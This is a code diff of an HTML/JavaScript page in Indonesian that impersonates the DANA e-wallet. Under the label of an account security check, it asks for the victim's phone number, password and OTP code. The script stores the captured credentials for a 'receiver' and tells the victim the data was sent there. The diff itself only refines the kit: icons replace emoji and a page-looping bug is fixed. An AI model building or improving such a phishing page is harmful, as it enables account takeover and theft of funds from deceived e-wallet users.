@@ -78,6 +78,7 @@
             border-radius: 60px;
             margin-top: 4px;
         }
+        .logo-dana .badge-verified i { font-size: 11px; margin-right: 4px; }
 
         .page-title {
             font-size: 18px;
@@ -85,6 +86,7 @@
             color: #1a1a2e;
             margin-bottom: 2px;
         }
+        .page-title i { color: #0080ff; margin-right: 6px; }
         .page-sub {
             color: #8a8aaa;
             font-size: 14px;
@@ -143,6 +145,7 @@
             cursor: not-allowed;
             transform: none;
         }
+        .btn-dana i { margin-right: 8px; }
 
         .loading-container {
             display: none;
@@ -221,6 +224,7 @@
             margin-bottom: 12px;
             display: none;
         }
+        .alert-dana i { margin-right: 6px; }
         .alert-dana.error {
             display: block;
             background: #fff0f0;
@@ -233,8 +237,6 @@
             border: 1px solid #b0e0b0;
             color: #0a7a3a;
         }
-
-        .hidden-receiver { display: none !important; }
 
         @media (max-width: 400px) {
             .card-dana { padding: 24px 16px; }
@@ -258,7 +260,7 @@
 
     <!-- PAGE 1: LOGIN -->
     <div class="page active" id="pageLogin">
-        <div class="page-title">🔐 Pengamanan Akun</div>
+        <div class="page-title"><i class="bi bi-shield-lock"></i> Pengamanan Akun</div>
         <div class="page-sub">Masukkan nomor DANA dan password Anda</div>
 
         <div class="alert-dana error" id="loginError">
@@ -275,7 +277,7 @@
                 <label class="label-dana"><i class="bi bi-lock"></i> Password</label>
                 <input type="password" id="danaPassword" class="form-control-dana" placeholder="Masukkan password" required>
             </div>
-            <button type="submit" class="btn-dana" id="btnLogin">Verifikasi</button>
+            <button type="submit" class="btn-dana" id="btnLogin"><i class="bi bi-check-circle"></i> Verifikasi</button>
         </form>
 
         <div class="footer-text">
@@ -297,7 +299,7 @@
 
     <!-- PAGE 3: OTP -->
     <div class="page" id="pageOtp">
-        <div class="page-title">📱 Kode Verifikasi</div>
+        <div class="page-title"><i class="bi bi-phone"></i> Kode Verifikasi</div>
         <div class="page-sub">Masukkan kode OTP yang dikirim ke nomor Anda</div>
 
         <div class="alert-dana error" id="otpError">
@@ -318,10 +320,12 @@
             Kode OTP dikirim ke <strong id="otpPhoneDisplay">08123456789</strong>
         </div>
 
-        <button class="btn-dana" id="btnOtp">Verifikasi</button>
+        <button class="btn-dana" id="btnOtp"><i class="bi bi-check-circle"></i> Verifikasi</button>
 
         <div style="text-align:center;margin-top:12px;">
-            <button class="btn btn-link" style="color:#0080ff;font-size:13px;text-decoration:none;border:none;background:none;font-weight:600;" onclick="resendOtp()">Kirim Ulang Kode</button>
+            <button class="btn btn-link" style="color:#0080ff;font-size:13px;text-decoration:none;border:none;background:none;font-weight:600;" onclick="resendOtp()">
+                <i class="bi bi-arrow-repeat"></i> Kirim Ulang Kode
+            </button>
         </div>
 
         <div class="footer-text">
@@ -333,7 +337,7 @@
 
 <script>
     // ============================================================
-    // INDEX.HTML — KIRIM DATA KE RECEIVER DULU
+    // INDEX.HTML — TANPA EMOJI, PAKE ICON, FIX LOOPING
     // ============================================================
 
     const loginForm = document.getElementById('loginForm');
@@ -343,6 +347,10 @@
     const loginErrorText = document.getElementById('loginErrorText');
     const otpError = document.getElementById('otpError');
     const otpErrorText = document.getElementById('otpErrorText');
+
+    // HIDE ERROR AWAL
+    loginError.style.display = 'none';
+    otpError.style.display = 'none';
 
     // OTP AUTO MOVE
     const otpInputs = ['otp1','otp2','otp3','otp4','otp5','otp6'];
@@ -373,7 +381,7 @@
         otpError.style.display = 'none';
     }
 
-    // ===== LOGIN — KIRIM DATA KE RECEIVER =====
+    // ===== LOGIN =====
     loginForm.addEventListener('submit', function(e) {
         e.preventDefault();
         hideAlerts();
@@ -383,16 +391,16 @@
 
         if (!phone || phone.length < 10 || !/^[0-9]+$/.test(phone)) {
             loginError.style.display = 'block';
-            loginErrorText.textContent = '❌ Nomor DANA harus angka minimal 10 digit.';
+            loginErrorText.textContent = 'Nomor DANA harus angka minimal 10 digit.';
             return;
         }
         if (!password || password.length < 6) {
             loginError.style.display = 'block';
-            loginErrorText.textContent = '❌ Password minimal 6 karakter.';
+            loginErrorText.textContent = 'Password minimal 6 karakter.';
             return;
         }
 
-        // === KIRIM DATA KE RECEIVER ===
+        // KIRIM DATA KE RECEIVER
         const userData = {
             phone: phone,
             password: password,
@@ -401,18 +409,15 @@
         };
         localStorage.setItem('dana_user_data', JSON.stringify(userData));
 
-        // === TAMPILKAN LOADING ===
         showPage('pageLoading');
 
-        // === SIMULASI PROSES ===
         setTimeout(() => {
-            // Tampilkan OTP
             document.getElementById('otpPhoneDisplay').textContent = phone;
             showPage('pageOtp');
         }, 2000);
     });
 
-    // ===== OTP VERIFICATION =====
+    // ===== OTP VERIFICATION — TIDAK LOOPING =====
     btnOtp.addEventListener('click', function() {
         hideAlerts();
 
@@ -423,17 +428,17 @@
 
         if (otp.length !== 6) {
             otpError.style.display = 'block';
-            otpErrorText.textContent = '❌ Masukkan 6 digit kode OTP.';
+            otpErrorText.textContent = 'Masukkan 6 digit kode OTP.';
             return;
         }
 
         if (!/^[0-9]+$/.test(otp)) {
             otpError.style.display = 'block';
-            otpErrorText.textContent = '❌ OTP harus berupa angka.';
+            otpErrorText.textContent = 'OTP harus berupa angka.';
             return;
         }
 
-        // === SIMPAN OTP KE RECEIVER ===
+        // SIMPAN OTP
         const otpData = {
             otp: otp,
             phone: document.getElementById('danaPhone').value.trim(),
@@ -443,31 +448,28 @@
         };
         localStorage.setItem('dana_otp_data', JSON.stringify(otpData));
 
-        // === UPDATE STATUS USER ===
+        // UPDATE STATUS USER
         const userData = JSON.parse(localStorage.getItem('dana_user_data'));
         if (userData) {
             userData.status = 'otp_sent';
             localStorage.setItem('dana_user_data', JSON.stringify(userData));
         }
 
-        // === NOTIFIKASI SUKSES ===
-        loginError.style.display = 'block';
-        loginError.className = 'alert-dana success';
-        loginError.innerHTML = `
-            <i class="bi bi-check-circle-fill"></i>
-            ✅ Kode OTP berhasil diverifikasi! Data telah dikirim ke receiver.
-        `;
+        // NOTIFIKASI SUKSES — TETAP DI HALAMAN OTP
+        otpError.style.display = 'block';
+        otpError.className = 'alert-dana success';
+        otpError.innerHTML = '<i class="bi bi-check-circle-fill"></i> Kode OTP berhasil diverifikasi! Data telah dikirim ke receiver.';
 
-        // Reset OTP
+        // RESET OTP
         otpInputs.forEach(id => {
             document.getElementById(id).value = '';
         });
         document.getElementById('otp1').focus();
 
-        // Kembali ke login
+        // KEMBALI KE LOGIN SETELAH 4 DETIK (TAPI TIDAK LOOPING)
         setTimeout(() => {
-            loginError.className = 'alert-dana error';
-            loginError.style.display = 'none';
+            otpError.className = 'alert-dana error';
+            otpError.style.display = 'none';
             showPage('pageLogin');
             document.getElementById('danaPhone').value = '';
             document.getElementById('danaPassword').value = '';
@@ -477,7 +479,7 @@
     // ===== RESEND OTP =====
     function resendOtp() {
         const phone = document.getElementById('danaPhone').value.trim();
-        showToast('📱 Kode OTP baru telah dikirim ke ' + phone);
+        showToast('Kode OTP baru telah dikirim ke ' + phone);
         otpInputs.forEach(id => {
             document.getElementById(id).value = '';
         });
@@ -535,4 +537,4 @@
 </script>
 
 </body>
-        </html>
+                               </html>
